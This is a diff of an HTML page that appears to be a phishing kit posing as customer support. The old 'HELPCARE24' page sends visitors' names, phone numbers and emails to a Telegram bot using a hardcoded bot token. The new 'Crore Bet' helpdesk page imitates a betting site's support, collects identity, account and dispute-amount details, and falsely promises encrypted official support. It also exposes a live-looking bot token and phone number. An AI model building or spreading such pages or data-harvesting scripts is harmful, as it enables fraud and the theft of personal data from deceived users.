@@ -1,120 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HELPCARE24 Premium Customer Care</title>
-
-<link rel="stylesheet" href="style.css">
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Crore Bet Premium Helpdesk</title>
+    <!-- Link to CSS file -->
+    <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
-<div class="bg1"></div>
-<div class="bg2"></div>
+<div class="app-container">
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-box">CRORE <span>BET</span></div>
+        <div class="status-badge">
+            <span class="status-dot"></span> Online
+        </div>
+    </header>
 
-<div class="card">
+    <main class="main-content">
+        <!-- Dashboard Intro -->
+        <div class="intro-dashboard" id="introScreen">
+            <h1>Priority Helpdesk</h1>
+            <p>Connect securely with the Crore Bet expert team. Fast-track your account verification, withdrawals, and deposits.</p>
+            
+            <button class="start-btn" id="openFormBtn">+ Create New Ticket</button>
+            
+            <a href="https://t.me/HELPCARE02" target="_blank" class="tg-banner">
+                💬 24/7 Live Agent <span>@HELPCARE02</span>
+            </a>
+        </div>
 
-<div class="logo">
+        <!-- Ticket Form -->
+        <div class="form-section" id="formScreen">
+            <div class="form-header">
+                <h2>Ticket Details</h2>
+                <button class="back-btn" id="backBtn">✕ Cancel</button>
+            </div>
 
-<div class="logo-circle">
-🛡️
+            <form id="supportForm">
+                <div class="field">
+                    <label>Full Name</label>
+                    <input type="text" id="name" placeholder="Name as per bank/ID" required>
+                </div>
+                <div class="field">
+                    <label>Registered Mobile</label>
+                    <input type="tel" id="mobile" placeholder="Your mobile number" required>
+                </div>
+                <div class="field">
+                    <label>Email Address</label>
+                    <input type="email" id="email" placeholder="Your email address" required>
+                </div>
+                <div class="field">
+                    <label>Crore Bet User ID</label>
+                    <input type="text" id="userid" placeholder="Your Account ID" required>
+                </div>
+                <div class="field">
+                    <label>Dispute Amount (₹)</label>
+                    <input type="number" id="amount" placeholder="e.g. 10000" required>
+                </div>
+                <div class="field">
+                    <label>Issue Category</label>
+                    <select id="problem" required>
+                        <option value="" disabled selected>Select category...</option>
+                        <option value="Email Confirm">Email Confirm</option>
+                        <option value="Profile Update">Profile Update</option>
+                        <option value="ID Verification">ID Verification</option>
+                        <option value="Withdrawal In Processing">Withdrawal In Processing</option>
+                        <option value="Withdrawal Decline">Withdrawal Decline</option>
+                        <option value="Deposit Not Received">Deposit Not Received</option>
+                        <option value="How to Withdraw">How to Withdraw</option>
+                    </select>
+                </div>
+                <button type="submit" class="submit-btn" id="submitBtn">Submit Ticket</button>
+            </form>
+
+            <div class="security-footer">
+                <strong>End-to-End Encrypted</strong>
+                We will never ask for your password. Official support is strictly confidential.
+            </div>
+        </div>
+    </main>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item"><span>⚄</span>Main</div>
+        <div class="nav-item"><span>📺</span>Live</div>
+        <div class="nav-item"><span>🎰</span>Casino</div>
+        <div class="nav-item active"><span>🤵</span>Dealers</div>
+        <div class="nav-item"><span>✈️</span>Aviator</div>
+        <div class="nav-item"><span>🎁</span>Bonuses</div>
+    </div>
 </div>
 
-<h1>HELPCARE24</h1>
-
-<p>Premium Customer Care Service</p>
-
-</div>
-
-<a href="tel:+917300365084" class="btn call">
-
-<i class="fa-solid fa-phone"></i>
-
-<span>CALL NOW</span>
-
-</a>
-
-<a href="https://wa.me/917300365084" class="btn whatsapp">
-
-<i class="fa-brands fa-whatsapp"></i>
-
-<span>WHATSAPP CHAT</span>
-
-</a>
-
-<a href="request.html" class="btn request">
-
-<i class="fa-solid fa-file-lines"></i>
-
-<span>SUBMIT REQUEST</span>
-
-</a>
-
-<div class="status">
-
-<div class="dot"></div>
-
-Support Available 24×7
-
-</div>
-
-<div class="footer">
-
-⭐⭐⭐⭐⭐ Trusted by Thousands
-
-</div>
-
-</div>
-<script>
-document.querySelector('form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const fullName = document.querySelector('input[placeholder*="Name"], input[type="text"]')?.value || "N/A";
-    const mobile = document.querySelector('input[placeholder*="Mobile"], input[type="tel"]')?.value || "N/A";
-    const email = document.querySelector('input[type="email"]')?.value || "N/A";
-    const category = document.querySelector('select')?.value || "Technical";
-    const description = document.querySelector('textarea')?.value || "N/A";
-
-    const telegramMessage = `🚨 New Helpcare24 Request!\n\n` +
-                            `👤 Name: ${fullName}\n` +
-                            `📱 Mobile: ${mobile}\n` +
-                            `✉️ Email: ${email}\n` +
-                            `📌 Category: ${category}\n` +
-                            `💬 Description: ${description}\n\n` +
-                            `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
-
-    const token = "8975364349:AAFVCmYj6KU6SGVFozbjElM-DUOJuFuB53M";
-    const chatId = "8882142102";
-
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    try {
-        const response = await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: telegramMessage,
-                parse_mode: "HTML"
-            })
-        });
-
-        if (response.ok) {
-            alert("✅ Request Submitted Successfully! Hamari team jaldi contact karegi.");
-            this.reset();
-        } else {
-            alert("❌ Submission failed. Please try again.");
-        }
-    } catch (err) {
-        alert("❌ Network error! Internet check karein.");
-    }
-});
-</script>
+<!-- Link to JavaScript file -->
+<script src="request.js"></script>
 </body>
 </html>
